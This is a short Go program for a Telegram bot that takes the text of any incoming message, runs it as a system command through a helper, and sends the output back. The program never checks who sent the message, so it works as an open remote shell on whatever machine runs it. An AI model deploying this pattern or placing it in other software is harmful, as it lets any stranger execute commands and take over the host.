package main

import (
	"log"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	"github.com/internetghost0/gotelebot/utils"
)

func main() {
	const TOKEN string = "SECRET-TOKEN"
	bot, err := tgbotapi.NewBotAPI(TOKEN)
	if err != nil {
		log.Panic(err)
	}
	// bot.Debug = true
	log.Printf("Authorized on account %s", bot.Self.UserName)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates, err := bot.GetUpdatesChan(u)
	if err != nil {
		log.Panic(err)
	}
	for update := range updates {
		if update.Message == nil { // ignore any non-message updates
			continue
		}
		log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)
		var cmds []string
		if strings.ContainsAny(update.Message.Text, "|") {
			cmds = strings.Split(update.Message.Text, "|")
		} else {
			cmds = strings.Split(update.Message.Text, " ")
		}
		log.Printf("utils.ExecCmd(%s, %v)", cmds[0], cmds[1:])
		out, err := utils.ExecCmd(cmds[0], cmds[1:])
		if err != nil {
			out = "[!] ERROR:\n" + err.Error()
		}

		msg := tgbotapi.NewMessage(update.Message.Chat.ID, out)
		msg.ReplyToMessageID = update.Message.MessageID
		bot.Send(msg)
	}
}
